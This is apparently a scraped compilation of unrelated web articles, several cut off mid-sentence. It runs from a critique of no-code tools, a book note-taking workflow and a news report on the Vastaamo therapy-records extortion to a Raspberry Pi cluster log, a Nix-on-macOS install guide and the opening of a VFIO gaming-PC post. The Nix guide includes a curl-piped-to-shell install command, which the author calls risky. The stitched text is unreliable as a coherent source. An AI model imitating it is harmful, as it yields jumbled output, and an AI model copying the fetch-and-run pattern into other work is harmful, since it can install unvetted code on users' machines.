src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fef5da496-a5df-467b-be5a-cd9b312e4a5d_624x89.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ef5da496-a5df-467b-be5a-cd9b312e4a5d_624x89.png&quot;,&quot;height&quot;:89,&quot;width&quot;:624,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:38478,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></p><p>The latitude and longitude for each store are in the Google maps link. Logically, what you need to do is the following - </p><ol><li><p>Extract the latitude longitude from each link.</p></li><li><p>Get user’s current location</p></li><li><p>Find distance between each store and user location. You can probably use Haversine formula here which should give good enough results.</p></li><li><p>Sort the list in the increasing order of distance found in step 3</p></li></ol><p>How do you accomplish this with a no-code tool? Let’s look at our options. </p><ol><li><p>Use an API? Okay, how do we write APIs? Code. Let’s say there is a tool to build APIs without code. How will you write the core sorting logic? Well, code.</p></li><li><p>Use Apps Script to sort the locations with respect to distance? What is Apps Script? Code.</p></li><li><p>Some no-code tools slip a coding paradigm of their own and call themselves no-code. That’s still code with the same problems and the same challenges as the other programming languages. So, code.</p></li></ol><p>Your only hope is if the tool provides this capability out-of-the-box. Even then, you will need to do some work to give it the data in just the right format that it needs.</p><p>Consider even a small modification to this problem. Let’s say you had to sort the list above with respect to a given fixed location that is available while the app is running, not the user’s location. This small tweak too can wreak havoc to a no-code solution. If the no-code tool expects you to specify the list to sort and the location to sort it by, you will be left wondering how to tell the tool to take user’s current location. If the tool takes user’s current location by default, you will be left wondering how to pass it your custom location.</p><p>This is a very small example. In a business that gets any kind of traction, eventually, flows get complex, validations get tricky and integrations get specific. You will see variants of the problem above, over and over again in different flavours.

<p><em>I’m no Ernest Hemingway. Nor I’m a best-selling author. But, I know a thing or two about distilling the key ideas from wrapped pieces of paper – also called books. Up to this point, I have over <a href="https://durmonski.com/category/book-summaries/" target="_blank" aria-label="100 summaries (opens in a new tab)" rel="noreferrer noopener">100 summaries</a> of famous titles published on my site. It took me a little over 2 years to categorize them. And, if I can name the main thing that I’ve been asked through these years from readers, it will have to be this, “What’s your approach when summarizing books?”</em></p>



<p>People who ask me this question – I think – expect that I use some elaborate system of AI-powered algorithm that tracks the movement of my eyes and send the sections I’ve been staring at the longest to a vault with notes. And, probably, they imagine that I have piles of wooden boxes filled with index cards that are carefully arranged and adequately numbered. Others, perhaps, imagine that I’m working directly with the CEO of a modern note-taking app and I have access to a not-yet-released version that reads our thoughts and transcribes what’s inside our heads in fancy online sheets.</p>



<p>It’s far simpler than that. Actually, the process I use is so simple and unfancy that I sometimes think that I should re-evaluate it and add more steps to make it “look” and “sound” more interesting to others.<span id="easy-footnote-1-11947"></span><span><a href="#easy-footnote-bottom-1-11947" title="Of course, I won&amp;#8217;t do that."><sup>1</sup></a></span></p>



<p>And while I’ve made some improvements in terms of how I take notes from the books I read, the process is still rather simple.</p>



<p>In this piece, I’ll do my best to describe my book summarizing process so you can start your own project or simply take better notes when reading.</p>



<p>First, let’s start with, why take notes…</p>







<h2><strong>Why It’s Important to Take Notes</strong>?</h2>



<p>For me, obviously, note-taking is an important step of my book-summarizing process. After all, the only way I can summarize the books I read is through my notes. However, I started taking notes from books long before this site was born.</p>



<p>Here’s why…</p>



<p>At some point, in my early 20s, I realized that the content I read was quickly forgotten. The things I found interesting in a book sat right where I left them – in the book itself.</p>



<p>And, what’s the point of reading <a href="https://durmonski.com/category/book-summaries/business-books/" target="_blank" aria-label="business books (opens in a new tab)" rel="noreferrer noopener">business books</a>, for example, if you can’t recall the insights of the author when you’re in a similar situation, right?</p>



<p>When I realized how I’m wasting my time and not taking full advantage of the contents, naturally, I started doing the simplest thing I could: writing down the most intriguing passages in a little notebook. This was before the mass adoption of smartphones – the pre-iPhone era. My phone back then was with a keypad layout.<span id="easy-footnote-2-11947"></span><span><a href="#easy-footnote-bottom-2-11947" title="Yes, imagine a Nokia 3310 type of phone. It&amp;#8217;s quite hard to take notes when you have to press 5 three times to get to the letter L."><sup>2</sup></a></span> And, the famous note-taking apps that we all use today were not even considered for creation.</p>



<p>The results of this simple habit were striking!</p>



<p>Taking notes with a pen and paper fortified the knowledge I gained from the books. I was able to reflect on the text and later go through my commentary again which, as a result, allowed me to remember the key ideas from the author for a longer period. Additionally, this allowed me to actually use the techniques mentioned in the books I read.</p>



<p>My conclusion was, and still is, that solely reading rarely helps. To understand what the author wanted to say, it’s essential to re-read, re-think, and re-write what is mentioned inside a book.</p>



<p>Or to put it differently, if you’re not distilling the main ideas from the books you read, most of the learned material will soon become obsolete in your brain. This, of course, is if your reading goals involve taking some sort of action based on the text. If you’re just reading for entertainment, then, obviously, taking notes is not really needed. </p>



<p>But the process of note-taking can be used in many other ways. We’re constantly consuming content in one form or another. If you regularly take note of the most important things from the articles, podcasts, or videos you consume, you’ll create a vast library of insights that can surely come in handy in your near future.</p>



<p>For now, though, let’s focus on reading books. And with this in mind, let me tell you how I approach reading:</p>







<h2>How I Read Books?</h2>



<p>I’m a huge book fan. I adore spending time in libraries. It’s amazing that in just one shelf in a library, there can be millions of pages full of wisdom. I can spend hours flipping big volumes and reading random passages from them.</p>



<p>Yet, collecting physical books started to become a burden for me at some point. The physical space in my modest apartment dedicated to books was quickly filled. But that was just part of the problem. Paying for shipping was starting to hurt my budget.<span id="easy-footnote-3-11947"></span><span><a href="#easy-footnote-bottom-3-11947" title="The average delivery price when using Amazon to Bulgaria is around 8 USD."><sup>3</sup></a></span> The solution was simple – ebooks.</p>



<p>But there was something else that made me switch from physical to ebooks – the workflow. Taking notes while you read an actual, physical book requires you to carry the book with you everywhere. Also, to take notes, you have to hold the book while you write the part you want to copy and make sure you don’t forget where you left. I mean, I’m sure you can relate if you ever had to take notes from a 700+ pages book while trying to pose for Instagram on your vintage sofa. It’s hard to balance your phone and the book.</p>



<p>That’s why, in 2019, I decided to switch to ebooks for good.<span id="easy-footnote-4-11947"></span><span><a href="#easy-footnote-bottom-4-11947" title="Not that I pose for Instagram while I read, but mainly because copying text from an ebook is super simple."><sup>4</sup></a></span></p>



<p>Not only I was reading more because my phone is with me all the time, but I was also taking faster notes.</p>



<p>Of course, for some people, reading on your phone seems impossible. After all, our smartphones are famous for being distraction machines that are capable of degenerating and destroying even the best intentions. A simple beep can suck you into an hour-long online browsing experience that ends up with the purchase of “essential” items for your apartment. </p>



<p>The way I solved this problem is rather popular: I simply stopped all forms of notifications. All the buzzing sounds. Uninstalled and blocked social media accounts and similar crippling software that’s not really adding real value to my physical existence.</p>



<p>I know, for most people, this is unthinkable. Removing your social media account (+ the notifications) is like cutting your left arm and throwing it to a mob of lunatic dogs.</p>



<p>Yet, that’s the main reason a lot of folks are unable to meet their reading goals (or goals in general). But that’s a topic I’ll probably discuss some other time.</p>



<p>Let’s move on…</p>







<h2>How I Actually Take Notes?</h2>



<p>I use Google Keep.</p>



<p>Yes, as mentioned, my process is quite simple.</p>



<p>I’m sure, I know actually, that there are other tools available. I’ve tested some of them. But tools are only as good as your ability to work with them.</p>



<p>A lot of people are so preoccupied with using the most modern tool that they spend weeks reading tutorials, buying courses even, on how to actually work with this software that they end-up forgetting why they started in the first place.</p>



<p>Google Keep works for me because it’s super simple. The lack of extra sexy functionalities, for me, is the best functionality.</p>



<p>When you have fewer options you focus on doing the actual task, not preoccupying your mind with configuration and settings.</p>



<p>Here’s how my Google Keep account is organized:</p>



<p>I have labels for different things I’m taking notes on. Obviously, book summaries is one of the things I note down. Inside this label, each additional box represents a particular book. However, since there is a character limit for a single note on Google Keep, I sometimes split the note into two or more – depending on my notes.<span id="easy-footnote-5-11947"></span><span><a href="#easy-footnote-bottom-5-11947" title="The character limit on Google Keep per note is 20,000. This is around 3,500 words. However, keep in mind that the limit also includes spaces. Meaning that each space eats up from your characters."><sup>5</sup></a></span></p>



<p>Here’s how I’ve organized my labels:</p>



<div><figure><img src="https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels.jpg" alt="" width="288" height="600" srcset="https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels.jpg 384w, https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels-144x300.jpg 144w, https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels-274x571.jpg 274w" sizes="(max-width: 288px) 100vw, 288px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20288%20600'%3E%3C/svg%3E" data-lazy-srcset="https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels.jpg 384w, https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels-144x300.jpg 144w, https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels-274x571.jpg 274w" data-lazy-src="https://durmonski.com/wp-content/uploads/2020/10/google-keep-my-labels.jpg"></figure></div>



<p>And, if I can give you a step-by-step process on how I summarize books it should look like this:</p>



<ol><li><strong>Questions</strong>: Before I start reading, I write down a few questions that I will look for answers to in the book. For example, let’s take a look at the book <a aria-label="Thinking in Bets (opens in a new tab)" href="https://durmonski.com/book-summaries/thinking-in-bets/" target="_blank" rel="noreferrer noopener">Thinking in Bets</a>. An obvious first question that I’ll look to answer is, “What is thinking in bets?” Then, probably this one, “Why thinking in bets is important and how I can think in bets?”<span id="easy-footnote-6-11947"></span><span><a href="#easy-footnote-bottom-6-11947" title="I suggesting reading the following book about getting better at reading: <a aria-label=&quot;How to Read a Book (opens in a new tab)&quot; href=&quot;https://durmonski.com/book-summaries/how-to-read-a-book/&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot; class=&quot;ek-link&quot;>How to Read a Book</a>."><sup>6</sup></a></span></li><li><strong>The purpose of the book</strong>: What’s the main purpose of the book? What’s the goal of the author? These are usually answered in the opening chapter of any book. Answering these questions helps me later formulate the following two sections in my book summaries: The Book In Three Or More Sentences and The Core Idea.</li><li><strong>Outline themes</strong>: Ideas in books are usually spread out. On page 20 you can spot a great idea about X. Then, 100 pages later, you can find additional information about this same idea, X. That’s why, when I take notes in my app, I try to highlight themes, I don’t simply summarize sections. For example, I’ll write: “Theme 02: We have a tendency to equate the quality of a decision with the quality of its outcome.” Then, I copy and paste sections from the book that reinforce this specific idea. As mentioned, the sections can be from different parts of the book. </li><li><strong>Outline actionable steps</strong>: Nonfiction books are full of actionable steps that you can practice – that’s why I love them. How to spot such practical lessons? Think about the following, “Is this applicable in the life of the average person?” Again, if we look at the book Thinking in Bets, there is a tool called 10-10-10. It’s about asking yourself the following set of questions: “[W]hat are the consequences of each of my options in ten minutes? In ten months? In ten years?” Everybody can benefit from this. You simply ask yourself a set of questions in a situation.</li></ol>



<p>Here are a couple of additional things I do when I take notes:</p>



<ul><li>I use the following phrase to highlight quotes from the text: “Quotes:”</li><li>I use the following to distinguish my thoughts from the words in the actual book: “Me:” Basically, what comes after “Me:” is mine annotation of the text. This later helps me when I write the summary.</li><li>As mentioned, I use “Theme #” and after that, I add text from the book that’s related to the particular topic. I use bullets to separate different sections from the book.</li><li>I use an additional note that I label “The Name of the Book #2” when I’ve reached the limit of the …</li></ul></div></div></div>

                    <p>The Finns were stunned this Friday at the outcome of a scandal caused by the <strong>extortion of a group of hackers</strong> to&nbsp;a private company that provides services as a psychotherapy center for the public health system.</p>

<p>In a country that claims to be at the forefront of digitization and data security, the criminals managed to access the database of thousands of customers of <strong>the company Vastaamo</strong> after detecting vulnerabilities in their system.</p>

<p>According to its website, Vastaamo offers psychological and psychiatric treatment to patients who suffer from disorders such as <strong>depression and anxiety</strong>.&nbsp;Many of the clients come from public services paid by the Finnish&nbsp;<strong>Social Security (Kela)</strong>.</p>

<p>Extortionists demanded around<strong> 450,000 euros (in bitcoins)</strong> in exchange for not publishing the clinical and mental health data of thousands of people.</p>

<p>The criminals started to publish <strong>the data of 100 people every day in the encrypted web Tor&nbsp;</strong>two days ago. They claimed they would not stop until&nbsp;they received the money.&nbsp;As the company was&nbsp;resisting to attend the demands of the hackers, personal data of over 200&nbsp;people - including minors - have been released online.</p>

<p>The information published could not be more sensitive: it included&nbsp;the patient's name, personal identification number, telephone number, email address and residence address, together <strong>with the content of the therapy sessions</strong>.</p>

<p>"An unknown hostile party has been in contact with Vastaamo and claims to have obtained confidential information from the company's customers.&nbsp;The Central Criminal Police launched a criminal investigation into the matter.&nbsp;Immediate notifications were also made to the Finnish Cyber ​​Security Center, Valvira and the Data Protection Commissioner.&nbsp;In addition, Vastamo took immediate steps to clarify the matter in cooperation with external and independent security experts," the company said in a press release.</p>

<h2>Rumours of ransom payment</h2>

<p>The data of <strong>another 100 people were published on Thursday </strong>night. But on Friday morning the page where the data was being released had been deleted, which triggered rumors about a possible payment to the extortionists.</p>

<p>At the time of writing this article, the company had&nbsp;neither confirmed nor denied the payment.&nbsp;<strong>Tuomas Kahri</strong>, Chairman of the Board of Vastaamo, told to the newspaper Ilta Sanomat that <strong>he would not comment on the ransom payment </strong>allegations.</p>

<p>The identity or nationality of the extortionists is unknown, and they appeared to not be worried about their possible arrest by the authorities.</p>

<p><strong>Ilta Sanomat </strong>exchanged several messages with them on Thursday, and according to the tabloid the criminals said they did not know that there was data of minors among the published information. However, they ensured that this would not stop their actions.</p>

<p>According to the same newspaper, the blackmailer had&nbsp;also offered individual patients the possibility of deleting their own data by <strong>paying about 540 euros in bitcoins</strong>.</p>

<h2>Police investigation</h2>

<p><strong>The National Bureau of Investigation (KRP)</strong> is investigating the attack as a case of gross breach and dissemination of private information. Police are asking people who have noticed their private information being disseminated to file an electronic crime report.</p>

<p>The company has been criticized for failing to notify customers earlier that their data was exposed in this extortion case. Some have complained they were contacted only after the case became known to the general public.</p>

                    <p>I’ve recently been getting more interested in distributed systems, and I wanted to get experience building some of the concepts I’ve read about.</p>
<p>My interest lies more on the software and system design side – more “how would we design and build an example of a distributed file system across four computers?” than “how do I make a reliable home server to play media?” – which is why my focus is on playing around with some toy software problems instead of worrying about what a real production hardware setup would look like. As with anything, it’s almost too easy to get caught up in the minor details instead of what you meant to work on, and I feel like I could spend days agonizing over hardware choices.</p>
<p>That being said, I did want to work with real hardware, which makes it more interesting than running VMs. There’s something about physically disconnecting ethernet switches to see the effect on the software that’s intriguing, and doubly so if the software can handle it gracefully.</p>
<p>I want to get a little more experience with the concepts behind some distributed systems papers and projects I’ve learned about. I’ve heard that the true devil of distributed systems lies in the details at scale, which isn’t really possible for my tiny cluster, but I’m planning to work through these projects to get a better feel for some of the general ideas. I’ve found that programming an implementation is one of the best ways to understand a concept, even if it’s a toy implementation, and I’m looking forward to doing so for some of the papers I’ve been reading.</p>
<p>I’m planning to write most of the software in Go because I’ve enjoyed working with its RPC library in the past and I want to get more experience working with the language. I do mostly C++/Java/JavaScript at work, and it’s always nice to explore outside of the comfort zone.</p>
<p>Anyways, back to the cluster; I ended up picking N=4 for my little cluster and drew up a quick diagram of what my plan:</p>
<p><img src="https://alexanderell.is/posts/pi-cluster/cluster-architecture.png" alt="Cluster Architecture diagram; 4 Raspberry Pis connected to a network switch"></p>
<center>
<em>The planned cluster, with 4 Raspberry Pis connected to power on the left and a network switch on the right</em>
</center>

<p>This ended up actually being pretty close to reality, which is always nice for design diagrams. I’ll spare you the order details (I’ve found these can quickly get out of date), but after the components trickled in, I wired up the Pis from 1-4 from bottom to top with a helpful case to keep them separate.</p>
<p><img src="https://alexanderell.is/posts/pi-cluster/cluster-picture.jpeg" alt="Photo of the 4 Raspberry Pis in action"></p>
<center>
<em>The cluster in action</em>
</center>

<p>So far I’ve done the following:</p>
<ul>
<li>Installed the Raspberry Pi OS Lite on each MicroSD &amp; enabled SSH</li>
<li>Grabbed the IPs and SSH’ed into each</li>
<li>Had to re-image a MicroSD after I didn’t save the password I generated</li>
<li>Did some basic ssh/scp/config setup to install .vimrc/tmux/vim/git/Go</li>
<li>Wrote up a basic heartbeat monitoring program to get them talking to each other</li>
<li>Spent 15 minutes debugging before I realized the switch was turned off</li>
</ul>

<p>My next steps are probably something like this, time and motivation permitting:</p>
<ul>
<li>Flesh out and write up the heartbeat monitoring program</li>
<li>Design and implement a basic distributed file system that I can reuse for future projects
<ul>
<li>Probably will follow along with GFS but with some appropriate adjustments</li>
</ul>
</li>
<li>Work through a few papers and adapt them to the mini-cluster
<ul>
<li>Tentatively thinking MapReduce, some KV store (implementing consistent hashing), Raft, etc.</li>
</ul>
</li>
</ul>
<p>Stay tuned for more :)</p>

October 25, 2020 | https://wickedchicken.github.io/post/macos-nix-setup/ | <a href="https://web.archive.org/web/*/https://wickedchicken.github.io/post/macos-nix-setup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>I recently got a new Macbook, and began setting up the <a href="https://nixos.org/">Nix</a> package manager to
install my developer toolset. I mainly did this to try and have a working setup without
installing <a href="https://brew.sh/">Homebrew</a>. Since I ran into a few issues, I wanted to briefly
document what I did and why in case others wanted to try the same.</p>
<h3 id="why-nix-and-why-not-homebrew-or-macports">Why Nix? (and why not Homebrew or MacPorts?)</h3>
<p>The short answer: hype.</p>
<p>The long answer: I’ve been frustrated with Homebrew’s user experience for years now, and
used this opportunity to start afresh. The default non-Homebrew answer is the venerable
<a href="https://www.macports.org/">MacPorts</a>, which has been around for quite a while. Most people who aren’t
functional programming or build system nerds should probably use MacPorts, as it has been
around long enough to have good support documentation floating around the internet.
Unfortunately I’m a sucker for hermetic builds <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, so I decided to try
Nix.</p>
<p>In addition, Nix has one cool feature I haven’t seen anywhere else: temporarily installing
packages using <code>nix-shell</code>. For example, I can install <code>ripgrep</code> inside a temporary shell,
and the package is automatically cleaned up when I’m done:</p>
<p>There’s a lot of cool stuff <code>nix-shell</code> can do, check out some more examples
<a href="https://ghedam.at/15978/an-introduction-to-nix-shell">here</a>.</p>
<h4 id="why-not-homebrew">Why not Homebrew?</h4>
<p>If Homebrew works for you, then by all means keep using Homebrew! However, I’ve grown
frustrated with it. Homebrew has spent a lot of effort making a software delivery system
work across many iterations of OSX/MacOS, and countless developers have installed <code>brew</code>
as one of the first things on a new Mac. It is with this acknowledgement of the work the
Homebrew developers have put into the software and its resulting success that I offer
these criticisms:</p>
<ol>
<li>
<p>Unpredictable command times. I never know if running <code>brew install</code> or <code>brew upgrade</code>
is going to take 5 seconds or 20 minutes. This usually means knowing if a program or
dependency is being downloaded as a prebuilt binary or compiled on the spot. It would
be nice to signal to the user if compilation is about to happen, so they can plan the
install accordingly.</p>
</li>
<li>
<p>Very slow <code>brew update</code> times. Homebrew’s core package database is a
<a href="https://github.com/Homebrew/homebrew-core">git repository</a>, which is great for enabling collaboration. Nix uses
the <a href="https://github.com/NixOS/nixpkgs">same model</a>, but the difference lies in how the clients get the package
database: <code>brew update</code> does a <code>git pull</code> under the hood, while <code>nix-channel --update</code>
downloads a compressed tarball each time the channel is updated. This means Homebrew
updates can rely on git and GitHub itself as an efficient distribution mechanism,
getting delta updates “for free” without setting up extra infrastructure. However,
this design choice means that the client has to maintain its own git repo –
<a href="https://github.com/Homebrew/brew/issues/4755#issuecomment-416572560"><code>git gc</code> can strike at any time</a>, for example, and slow things down
tremendously. It is also a nightmare for <a href="https://discourse.brew.sh/t/best-practice-for-homebrew-on-travis-brew-update-is-5min-to-build-time/5215">CI</a>, where the lack of
an updated Homebrew git cache can negatively impact build times. Meanwhile,
<code>nix-channel --update</code> runs are very predictable, even if a bit inefficient – you’re
downloading a 16Mb tarball when the channel is updated, but that’s it.</p>
</li>
<li>
<p>Bad interactions when packages are upgraded. I’m not sure exactly why this happens, but
occasionally when certain packages are upgraded (such as <code>python</code> from 3.7 to 3.8),
<a href="https://discourse.brew.sh/t/homebrew-updating-major-python-version-breaks-a-lot-of-things-on-my-system/8545">related packages can break</a>. Because Nix builds are hermetic,
packages should all “work together” regardless of how the system was previously set
up.</p>
</li>
</ol>
<h4 id="why-not-macports">Why not MacPorts?</h4>
<p>To be honest, MacPorts is probably just fine for your needs. I haven’t used it in forever,
but my understanding is that it’s reliable and has plenty of built-up community knowledge
on how to fix things. Take a look at it and see if it fits your needs! I also quickly
found <a href="https://saagarjha.com/blog/2019/04/26/thoughts-on-macos-package-managers/">this post</a> which details some differences between it and
Homebrew. But hey, if you like adventure, give Nix a shot!</p>
<h4 id="why-not-nix">Why not Nix?</h4>
<p>I felt it was honest to include a section like this.</p>
<ol>
<li>
<p>I haven’t done a deep evaluation, but my impression is that Nix is the least documented
and least mature of the bunch. Expect to do a bit more digging to solve issues, but
once you get started it generally just works.</p>
</li>
<li>
<p>Workarounds are currently needed for Catalina and above, especially if you have an
older Mac without a T2 chip.</p>
</li>
<li>
<p>You’ll need to understand a bit of the <a href="https://nixos.wiki/wiki/Nix_Expression_Language">Nix Expression Language</a>. It’s
not as scary as it sounds, but you will have to edit a <code>.nix</code> file to install a
package (there is no CLI equivalent to <code>brew install</code> that I am aware of).</p>
</li>
</ol>
<h3 id="installing-nix">Installing Nix</h3>
<p>Installing Nix requires two phases: installing Nix itself, and then installing
<a href="https://github.com/LnL7/nix-darwin">nix-darwin</a>. The installation methods I know of involve <code>curl</code>ing with an
eventual <code>sudo</code> call inside the script<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. You will have to do something extra if
you’re running Catalina<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> or above.</p>
<ol>
<li>
<p>Install Nix:</p>
<ul>
<li>Pre-Catalina: <code>curl https://nixos.org/nix/install | sh</code> (I haven’t tested this).</li>
<li>Catalina with a T2 chip: <code>sh &lt;(curl -L https://nixos.org/nix/install) --darwin-use-unencrypted-nix-store-volume</code>
(according to the site, “unecrypted” is a misnomer as the chip will encrypt it
anyway).</li>
<li>Catalina without a T2 chip: follow <a href="https://www.philipp.haussleiter.de/2020/04/fixing-nix-setup-on-macos-catalina/">these instructions</a>
<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>.</li>
</ul>
<p>Make sure that <code>nix-build</code> is now in your <code>PATH</code>. You may have to source
<code>$HOME/.nix-profile/etc/profile.d/nix.sh</code> in your shell’s <code>rc</code> file to get this to
work.</p>
</li>
<li>
<p>Install <code>nix-darwin</code>:</p>
<div><pre><code data-lang="sh">nix-build https://github.com/LnL7/nix-darwin/archive/master.tar.gz -A installer ./result/bin/darwin-installer
</code></pre></div><p>You should now have <code>darwin-rebuild</code> in your <code>PATH</code>.</p>
</li>
</ol>
<h3 id="using-nix">Using Nix</h3>
<p>The basic workflow for using Nix is editing <code>~/.nixpkgs/darwin-configuration.nix</code> and then
running <code>darwin-rebuild switch</code> to activate those changes.</p>
<h4 id="editing-darwin-configurationnix">Editing <code>darwin-configuration.nix</code></h4>
<p>Open up <code>~/.nixpkgs/darwin-configuration.nix</code> with your favorite editor. Look at
<code>environment.systemPackages</code>: this is the list of packages you’ll want to install.
<a href="https://nixos.org/guides/nix-pills/basics-of-language.html#idm140737320584496">Nix lists</a> are space-delimited (not comma-delimited). The packages listed
there come from the Nixpkgs channel you’re subscribed to. You can list what packages are
available by running <code>nix-env -qaP</code> or searching <a href="https://search.nixos.org/packages">Nixpkgs</a> online. All the
packages are prepended with <code>pkgs.</code>; I used Nix’s <code>with pkgs;</code> clause to prepend that by
default:</p>
<div><pre><code data-lang="nix">  environment<span>.</span>systemPackages <span>=</span> <span>with</span> pkgs; [
      gitAndTools<span>.</span>gitFull
      byobu
      wget
    ];
</code></pre></div><h4 id="activating-your-changes">Activating your changes</h4>
<p>Once you’re done editing, run <code>darwin-rebuild switch</code> to install your new packages! If you
made an error, <code>darwin-rebuild</code> will let you know and your current environment will not be
affected.</p>
<h4 id="updating-the-package-database">Updating the package database</h4>
<p>If you want to update the package database, you can run</p>
<h4 id="advanced-usage">Advanced usage</h4>
<p>Nix will detect conflicts and error out, such as when two packages install the same
binary. This can happen when <code>python37</code> and <code>python38</code>, for example, both want to create a
binary called <code>pydoc3</code>. To resolve this, you can call <code>lowPrio</code> to declare a package low
priority and have the other package win.</p>
<div><pre><code data-lang="nix">  environment<span>.</span>systemPackages <span>=</span> <span>with</span> pkgs; [
      python37
      (lowPrio python38)
    ];
</code></pre></div><p>(As a side note: once you’ve installed both, look at how quickly you can uninstall and
reinstall each package. It takes between 1 and 2 seconds to uninstall or reinstall
python3.7, which in my opinion is ridiculously fast.)</p>
<h3 id="further-reading">Further reading</h3>
<p>I have to admit that I only have a shallow knowledge of Nix, and the information above
has made it sufficient as a daily replacement for Homebrew. However, there is a rich
ecosystem around Nix that you may want to explore further. Here are a few links to learn
more:</p>

<p>I hope this guide was helpful! Thanks to the Nix team for making such a cool package
manager. As I’m relatively new to Nix, feel free to contact me if there’s something I got
wrong or could have explained more clearly. Good luck and have fun with Nix!</p>

<li id="fn:1" role="doc-endnote">
<p>From the <a href="https://landing.google.com/sre/sre-book/chapters/release-engineering/">Google SRE book</a>: a build that is “insensitive to
the libraries and other software installed on the build machine.” This greatly
increases reliability, because it means that whatever you have installed on your
computer is less likely to affect the build process and the resulting program. This is
similar to <a href="https://www.docker.com/">Dockerizing</a> an application, but less extreme and less
resource-intensive to run. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>This is just as risky as the classic <a href="https://stackoverflow.com/questions/29382739/why-using-curl-sudo-sh-is-not-advised"><code>curl | sudo sh</code></a>.
Unfortunately I can’t find another way to easily install Nix, so I guess you can
download <a href="https://nixos.org/nix/install">https://nixos.org/nix/install</a> and <a href="https://nixos.org/guides/nix-pills/install-on-your-running-system.html#idm140737320801568">compare its signature</a> before
running it. <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>Catalina gets a lot of shade for its read-only root filesystem and signed
binaries, but I think it’s a step forward for general purpose computing. What I object
to is that signed binaries must be signed with registered Apple developer accounts,
which cost money. It would be nice if that was a bit distributed, so anyone could sign
and Apple maintained a reputation database or something. I’m annoyed at Apple for
mixing good security and OS maintenance practices with total, walled-garden lockdown.
Admittedly, the web has a lot of the <a href="https://xkcd.com/1367/">same security benefits</a>, but we’re not at a
point yet where web apps can compete with native applications. Hopefully we’ll get
there one day. <a href="#fnref:3" role="doc-backlink">↩︎</a></p>

October 25, 2020 | https://m1cr0man.com/posts/sharing-gaming-pc/ | <a href="https://web.archive.org/web/*/https://m1cr0man.com/posts/sharing-gaming-pc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>With the current shortages on all computer parts world wide, the release of the next Nvidia series, and my personal decision to live at home until the end of the pandemic, I got the idea that maybe it was time to upgrade my computer.</p>
<p>My whole family is into gaming - well, my brother, dad and me that is. All the computers are in the same room, which makes for some interesting voice calls when the background noise includes <a href="https://store.steampowered.com/app/945360/Among_Us/">desperate attempts to plead innocent of murder</a> and <a href="https://store.steampowered.com/app/581320/Insurgency_Sandstorm/">attempting to coordinate a terrorist insurgency</a>. Beyond the noise, one of the big issues with this is the power usage and heat generated from the 3 gaming computers, and occasionally the file server is on too, which contains ~2tb of our Steam games (more on that in another blog post).</p>
<p>I have been following the story of <a href="https://www.reddit.com/r/VFIO">VFIO</a> passthrough for a while, and a few of my friends have been successfully gaming on a Windows VM on top of Linux since last year. I had bigger ideas though - what if I could run two gaming VMs on one PC?</p>
<p>Spoilers: This did not go well for reasons completely out of my control, which I will explain later in the article. I’m writing this blog post because it was a fun project and I spent a lot of weekends trying to get it to work for the games I wanted to play, and maybe it will help someone else.</p>
<h2 id="why">Why?</h2>
<p>
<a href="https://m1cr0man.com/posts/sharing-gaming-pc/images/computer.jpg"><img src="https://m1cr0man.com/posts/sharing-gaming-pc/images/computer_hufa4a6146b9cfde28a01e6972453f1dc6_604301_0x384_resize_q85_gaussian.jpg" title="My computer in all its UV glory"></a>


Initially, my main motives were the power and cost savings, but I quickly realized that I wasn’t going to save that much power or money (my brother would though!) if I included the GPU upgrades I wanted and how much power they consumed. However as I got into it there were some other major benefits.</p>
<p>Firstly, if Windows is installed in a VM there is no real need to do a system reload even if the underlying hardware changes. As anyone who has <a href="https://www.sinitargaming.com/nv.html">modded a Bethesda game</a> will know, reinstalling some games can take days especially if you have a poor internet connection. Since I was setting up two identical VMs, this also meant I only needed to do one system install and then I could clone the filesystem to the other.</p>
<p>Speaking of the filesystem, I’m a huge fan of ZFS. There are some magic-tier benefits of using this as the backing store for the VMs. I initially built the VMs with 60gb disks on a 256gb SSD. You would expect the total storage usage of two Windows installs to be around 40gb or so, but since I was able to clone one install from the other, and I had compression enabled, the total space used to install both OSes came to under 15gb! With deduplication enabled, I was also able to save huge amounts of space between games installed on both VMs. I estimated that both VMs would end up with at least 150gb usable space on the 250gb SSD, including the space used for the Linux install.</p>
<p>With all this in mind, I was also going to compact our file server into this PC too. The Linux side of this host can be used for more than just running VMs. If I was to buy two 14tb HDDs I could migrate all of our server files onto it and I would be combining <em>three</em> computers into one.</p>
<p>Despite all these benefits, I wasn’t going to give up anything to move to a VM. If I couldn’t get two screens and my sound card working, I was going to bail on the project. It would also be especially difficult to convince my brother to give up his PC if he had to make compromises too!</p>
<h2 id="how">How?</h2>
<p>
<a href="https://m1cr0man.com/posts/sharing-gaming-pc/images/zfs.png"><img src="https://m1cr0man.com/posts/sharing-gaming-pc/images/zfs_hud78be23e827bb3cf72d2a2d8198aa976_66343_0x384_resize_q85_gaussian_2.png" title="ZFS storage usage is very low"></a>


